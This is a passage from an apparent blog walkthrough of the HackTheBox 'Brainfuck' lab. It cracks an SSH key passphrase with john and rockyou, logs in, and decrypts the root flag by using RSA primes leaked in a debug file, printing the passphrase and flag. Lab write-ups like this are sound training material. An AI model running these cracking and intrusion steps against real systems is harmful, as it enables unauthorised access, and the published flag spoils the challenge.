<span class="go">/home/user/Downloads/id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190</span>
</pre></div>


<p>Then I launch John and just after less than 10 minutes it finds the key:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> john id_rsa_john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
<span class="go">Using default input encoding: UTF-8</span>
<span class="go">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span>
<span class="go">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span>
<span class="go">Cost 2 (iteration count) is 1 for all loaded hashes</span>
<span class="go">Will run 8 OpenMP threads</span>
<span class="go">Note: This format may emit false positives, so it will keep trying even after</span>
<span class="go">finding a possible candidate.</span>
<span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="go">0g 0:00:03:54 30.05% (ETA: 16:44:35) 0g/s 19124p/s 19124c/s 19124C/s putterfly..puttaro</span>
<span class="go">0g 0:00:06:45 53.69% (ETA: 16:44:11) 0g/s 19184p/s 19184c/s 19184C/s grumbles5..gruiz_24</span>
<span class="go">0g 0:00:09:31 76.59% (ETA: 16:44:02) 0g/s 19215p/s 19215c/s 19215C/s KdificilEsCrYo..Kcn2048</span>
<span class="go">3poulakia!       (/home/user/Downloads/id_rsa)</span>
<span class="go">Session completed</span>
</pre></div>


<p>So now I can ssh to the box with the ssh key that whose password is <strong>3poulakia!</strong></p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> ssh -i /home/user/Downloads/id_rsa orestis@10.10.10.17
<span class="go">The authenticity of host &#39;10.10.10.17 (10.10.10.17)&#39; can&#39;t be established.</span>
<span class="go">ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.</span>
<span class="go">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
<span class="go">Warning: Permanently added &#39;10.10.10.17&#39; (ECDSA) to the list of known hosts.</span>
<span class="go">Enter passphrase for key &#39;/home/user/Downloads/id_rsa&#39;: </span>
<span class="go">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)</span>

<span class="go"> * Documentation:  https://help.ubuntu.com</span>
<span class="go"> * Management:     https://landscape.canonical.com</span>
<span class="go"> * Support:        https://ubuntu.com/advantage</span>

<span class="go">0 packages can be updated.</span>
<span class="go">0 updates are security updates.</span>


<span class="go">You have mail.</span>
<span class="go">Last login: Wed May  3 19:46:00 2017 from 10.10.11.4</span>
</pre></div>


<p>a simple <strong><em>ls</em></strong> gives us this output:</p>
<div class="highlight"><pre><span></span><span class="gp">orestis@brainfuck:~$</span> ls
<span class="go">debug.txt  encrypt.sage  mail  output.txt  user.txt</span>
</pre></div>


<p>and therefore we can read the user.txt</p>
<div class="highlight"><pre><span></span><span class="gp">orestis@brainfuck:~$</span> cat user.txt 
<span class="go">2c****************************c9</span>
</pre></div>


<p>Inspecting the content of the home directory, I find <strong>encrypt.sage</strong> pretty interesting:</p>
<div class="highlight"><pre><span></span><span class="gp">orestis@brainfuck:~$</span> cat encrypt.sage 
<span class="go">nbits = 1024</span>

<span class="go">password = open(&quot;/root/root.txt&quot;).read().strip()</span>
<span class="go">enc_pass = open(&quot;output.txt&quot;,&quot;w&quot;)</span>
<span class="go">debug = open(&quot;debug.txt&quot;,&quot;w&quot;)</span>
<span class="go">m = Integer(int(password.encode(&#39;hex&#39;),16))</span>

<span class="go">p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)</span>
<span class="go">q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)</span>
<span class="go">n = p*q</span>
<span class="go">phi = (p-1)*(q-1)</span>
<span class="go">e = ZZ.random_element(phi)</span>
<span class="go">while gcd(e, phi) != 1:</span>
<span class="go">    e = ZZ.random_element(phi)</span>



<span class="go">c = pow(m, e, n)</span>
<span class="go">enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\n&#39;)</span>
<span class="go">debug.write(str(p)+&#39;\n&#39;)</span>
<span class="go">debug.write(str(q)+&#39;\n&#39;)</span>
<span class="go">debug.write(str(e)+&#39;\n&#39;)</span>
</pre></div>


<p>Again, if you are familiar with cryptography, this may resamble to <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA encryption</a>. Particularly interesting is that the debug entries at the end of the file indicate that <strong>p</strong>, <strong>q</strong>, and <strong>e</strong> are written in debug.txt. </p>
<div class="highlight"><pre><span></span><span class="gp">orestis@brainfuck:~$</span> cat debug.txt 
<span class="go">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
<span class="go">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
<span class="go">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
</pre></div>


<p>So looking ad debug.txt we should have <strong>p</strong>, <strong>q</strong>, and <strong>e</strong> respectively on each separate line. I then started to look on google for a way to retrieve <strong>d</strong> (the decryption key) from <strong>p</strong>, <strong>q</strong>, and <strong>e</strong>.</p>
<p>I found a python script on a <a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">stackexchange post</a> which may do the trick:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span>
    <span class="k">while</span> <span class="n">a</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">q</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="n">b</span><span class="o">//</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="o">%</span><span class="n">a</span>
        <span class="n">m</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">x</span><span class="o">-</span><span class="n">u</span><span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="n">y</span><span class="o">-</span><span class="n">v</span><span class="o">*</span><span class="n">q</span>
        <span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="n">a</span><span class="p">,</span><span class="n">r</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span><span class="n">n</span>
        <span class="n">gcd</span> <span class="o">=</span> <span class="n">b</span>
    <span class="k">return</span> <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">p</span> <span class="o">=</span> <span class="mi">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
    <span class="n">q</span> <span class="o">=</span> <span class="mi">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
    <span class="n">e</span> <span class="o">=</span> <span class="mi">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="mi">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span>

    <span class="c1"># compute n</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>

    <span class="c1"># Compute phi(n)</span>
    <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># Compute modular inverse of e</span>
    <span class="n">gcd</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">a</span>

    <span class="nb">print</span><span class="p">(</span> <span class="s2">&quot;n:  &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="p">);</span>

    <span class="c1"># Decrypt ciphertext</span>
    <span class="n">pt</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span> <span class="s2">&quot;pt: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span> <span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>


<p>I replaced <strong>p</strong>, <strong>q</strong>, and <strong>e</strong> with the values found on debug.txt and the cypher-text <strong>ct</strong> with the value found in output.txt.</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> python decrypt_rsa.py
<span class="go">n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977</span>
<span class="go">pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750</span>
</pre></div>


<p>so we got <strong>pt</strong>, the plain-text, which we now need to convert into readable ascii. Since it was originally converted from string to hex and then to int, we now first convert it to hex and then back to string as follow:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> python
<span class="go">Python 2.7.17 (default, Oct 19 2019, 23:36:22) </span>
<span class="go">[GCC 9.2.1 20191008] on linux2</span>
<span class="go">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span>
<span class="gp">&gt;</span>&gt;&gt; <span class="nv">pt</span><span class="o">=</span><span class="m">24604052029401386049980296953784287079059245867880966944246662849341507003750</span>
<span class="gp">&gt;</span>&gt;&gt; print<span class="o">(</span>str<span class="o">(</span>hex<span class="o">(</span>pt<span class="o">)[</span><span class="m">2</span>:-1<span class="o">])</span>.decode<span class="o">(</span><span class="s1">&#39;hex&#39;</span><span class="o">))</span>
<span class="go">6efc1a5dbb8904751ce6566a305bb8ef</span>
</pre></div>


<p>The string we obtain is the root.txt.</p>
			<style>
#pcs-comment-form input,
#pcs-comment-form textarea {
	width: 100%;
}
#pcs-comment-form-display-replyto {
	border: solid 1px black;
	padding: 2px;
}
#pcs-comment-form-display-replyto p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}
#pcs-comments ul {
	list-style: none;
}
#pcs-comments .comment-left {
	display: table-cell;
	padding-right: 10px;
}
#pcs-comments .comment-body {
	display: table-cell;
	vertical-align: top;
	width: 100%;
}
</style>

	<section id="pcs-comments">
	<header>
		<h2>Comments</h2>
		<hr/>
	</header>
		<p>There are no comments yet.</p>
	<section>
	<form id="pcs-comment-form" action="#">
		<legend>Add a Comment</legend>
		<input type="hidden" id="pcs-comment-form-input-replyto">
		<fieldset>
			<label for="pcs-comment-form-input-name">Name</label>
			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
		</fieldset>
		<fieldset>
			<label for="pcs-comment-form-input-website">Website</label>
			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
		</fieldset>
		<fieldset>
			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
		</fieldset>

		<button type="submit"
				id="pcs-comment-form-button-submit"
				>Post via email</button>

			<a href="https://sittingducks.io/feeds/comment.Brainfuck.atom.xml">
				Comment Atom Feed
			</a>
	</form>
</section>

</section>

			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			CommentSystem.email_user   = "sittingducks.io";
			CommentSystem.email_domain = "protonmail.com";
			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
				return ''
					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
					+ 	'√ó'
					+ '</button>'
					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
			};

			$('#pcs-comment-form').on("submit",
				function( event )
				{
					event.preventDefault();
					$(location).attr('href', CommentSystem.getMailtoLink("Brainfuck"));
				}
			);
		});
	</script>


      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->




  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>

  
 <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
	<!-- Make sure jquery is loaded first, then load colorbox -->
  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>


  
  
</body>
</html>